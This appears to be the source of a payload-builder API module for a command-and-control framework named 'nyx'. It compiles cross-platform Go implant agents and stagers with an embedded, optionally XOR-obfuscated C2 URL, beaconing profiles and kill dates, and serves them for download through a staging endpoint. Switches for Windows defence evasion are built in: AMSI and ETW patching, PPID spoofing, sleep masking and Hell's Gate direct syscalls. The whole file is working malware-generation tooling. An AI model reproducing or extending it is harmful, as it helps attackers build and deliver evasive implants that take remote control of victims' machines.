import os
import subprocess
import tempfile
import shutil
import secrets
from fastapi import APIRouter, HTTPException, Depends
from fastapi.responses import FileResponse
from pydantic import BaseModel
from typing import Optional
from core.auth import get_current_operator
from core.profile import profile_ldflags

router = APIRouter(prefix="/api/builder", tags=["builder"])

AGENT_SRC   = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../agent"))
STAGER_SRC  = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../agent/stager"))
STAGE_CACHE = os.path.join(tempfile.gettempdir(), "nyx_stage_cache")

PLATFORMS = {
    "linux-amd64":   {"GOOS": "linux",   "GOARCH": "amd64",  "ext": ""},
    "linux-arm64":   {"GOOS": "linux",   "GOARCH": "arm64",  "ext": ""},
    "darwin-amd64":  {"GOOS": "darwin",  "GOARCH": "amd64",  "ext": ""},
    "darwin-arm64":  {"GOOS": "darwin",  "GOARCH": "arm64",  "ext": ""},
    "windows-amd64": {"GOOS": "windows", "GOARCH": "amd64",  "ext": ".exe"},
}


def xor_encode_hex(text: str, key: str) -> str:
    out = []
    for i, ch in enumerate(text.encode()):
        out.append(f"{ch ^ ord(key[i % len(key)]):02x}")
    return "".join(out)


class BuildRequest(BaseModel):
    c2_url: str
    platform: str
    sleep: int = 5
    jitter: int = 1
    obfuscate: bool = False
    profile: str = "default"
    kill_date: str = ""         # "YYYY-MM-DD" or empty
    jitter_mode: str = "linear" # linear | gaussian | sinusoidal | burst
    enc_key: str = ""           # 32-byte hex AES-256 key (optional, ECDH preferred)
    build_stager: bool = False  # build minimal stager instead of full agent
    # ── Faz 2: EDR Evasion (Windows) ──────────────────────────────────────
    enable_amsi: bool = False       # patch AmsiScanBuffer on startup
    enable_etw: bool = False        # patch EtwEventWrite on startup
    enable_ppid: bool = False       # PPID spoofing for child processes
    ppid_target: str = "explorer.exe"
    enable_sleep_mask: bool = False # encrypt sensitive data during sleep
    enable_syscalls: bool = False   # Hell's Gate direct syscalls


def _build_env(p: dict) -> dict:
    env = os.environ.copy()
    env["GOOS"]        = p["GOOS"]
    env["GOARCH"]      = p["GOARCH"]
    env["CGO_ENABLED"] = "0"
    env["PATH"]        = env.get("PATH", "") + ":/opt/homebrew/bin:/usr/local/go/bin"
    return env


@router.get("/platforms")
def list_platforms(_: str = Depends(get_current_operator)):
    return list(PLATFORMS.keys())


@router.post("/build")
def build_agent(req: BuildRequest, _: str = Depends(get_current_operator)):
    if req.platform not in PLATFORMS:
        raise HTTPException(400, f"Unknown platform. Choose from: {list(PLATFORMS.keys())}")

    p = PLATFORMS[req.platform]
    ext = p["ext"]
    suffix = "-stager" if req.build_stager else ""
    obf_suffix = "-obf" if req.obfuscate else ""
    out_name = f"nyx-agent{suffix}-{req.platform}{obf_suffix}{ext}"

    tmp_dir = tempfile.mkdtemp()
    out_path = os.path.join(tmp_dir, out_name)
    env = _build_env(p)

    if req.obfuscate:
        xor_key     = secrets.token_hex(4)
        encoded_url = xor_encode_hex(req.c2_url, xor_key)
        url_var     = encoded_url
        key_var     = xor_key
    else:
        url_var = req.c2_url
        key_var = ""

    pf = profile_ldflags(req.profile)

    if req.build_stager:
        ldflags = (
            f"-s -w "
            f"-X main.C2URL={url_var} "
            f"-X main.XORKey={key_var} "
            f"-X main.ProfileCheckin={pf['ProfileCheckin']} "
            f"-X main.ProfileUA={pf['ProfileUA']}"
        )
        src = STAGER_SRC
    else:
        ldflags = (
            f"-s -w "
            f"-X main.C2URL={url_var} "
            f"-X main.XORKey={key_var} "
            f"-X main.DefaultSleep={req.sleep} "
            f"-X main.DefaultJitter={req.jitter} "
            f"-X main.JitterMode={req.jitter_mode} "
            f"-X main.KillDate={req.kill_date} "
            f"-X main.EncKey={req.enc_key} "
            f"-X main.ProfileName={pf['ProfileName']} "
            f"-X main.ProfileUA={pf['ProfileUA']} "
            f"-X main.ProfileCheckin={pf['ProfileCheckin']} "
            f"-X main.ProfileTask={pf['ProfileTask']} "
            f"-X main.ProfileResult={pf['ProfileResult']} "
            f"-X main.ProfileHeaders={pf['ProfileHeaders']} "
            f"-X main.ProfileContentType={pf['ProfileContentType']} "
            f"-X main.ProfileRespPrefix={pf['ProfileRespPrefix']} "
            f"-X main.ProfileRespSuffix={pf['ProfileRespSuffix']} "
            f"-X main.EnableAmsi={'1' if req.enable_amsi else '0'} "
            f"-X main.EnableEtw={'1' if req.enable_etw else '0'} "
            f"-X main.EnablePpid={'1' if req.enable_ppid else '0'} "
            f"-X main.PpidTarget={req.ppid_target} "
            f"-X main.EnableSleepMask={'1' if req.enable_sleep_mask else '0'} "
            f"-X main.EnableSyscalls={'1' if req.enable_syscalls else '0'}"
        )
        src = AGENT_SRC

    result = subprocess.run(
        ["go", "build", f"-ldflags={ldflags}", "-o", out_path, "."],
        cwd=src,
        env=env,
        capture_output=True,
        text=True,
        timeout=180,
    )

    if result.returncode != 0:
        shutil.rmtree(tmp_dir, ignore_errors=True)
        raise HTTPException(500, f"Build failed: {result.stderr}")

    # Cache for /stage endpoint
    os.makedirs(STAGE_CACHE, exist_ok=True)
    cache_key = f"{p['GOOS']}-{p['GOARCH']}"
    shutil.copy2(out_path, os.path.join(STAGE_CACHE, cache_key + ext))

    return FileResponse(
        out_path,
        filename=out_name,
        media_type="application/octet-stream",
        background=None,
    )


@router.get("/stage/{goos}/{goarch}")
def serve_stage(goos: str, goarch: str, _: str = Depends(get_current_operator)):
    """Serve a cached stage binary (built by the builder). Compiles on demand if missing."""
    if goos not in ("linux", "darwin", "windows") or goarch not in ("amd64", "arm64"):
        raise HTTPException(400, "Invalid platform")

    ext = ".exe" if goos == "windows" else ""
    cache_key = f"{goos}-{goarch}"
    cached = os.path.join(STAGE_CACHE, cache_key + ext)

    if not os.path.exists(cached):
        # Compile on demand with defaults
        platform_key = f"{goos}-{goarch}"
        if platform_key not in PLATFORMS:
            raise HTTPException(404, "No cached stage — build one via /api/builder/build first")
        p = PLATFORMS[platform_key]
        env = _build_env(p)
        os.makedirs(STAGE_CACHE, exist_ok=True)
        result = subprocess.run(
            ["go", "build", "-ldflags=-s -w", "-o", cached, "."],
            cwd=AGENT_SRC,
            env=env,
            capture_output=True,
            text=True,
            timeout=180,
        )
        if result.returncode != 0:
            raise HTTPException(500, f"Stage compile failed: {result.stderr}")

    return FileResponse(cached, media_type="application/octet-stream",
                        filename=f"nyx-stage-{goos}-{goarch}{ext}")
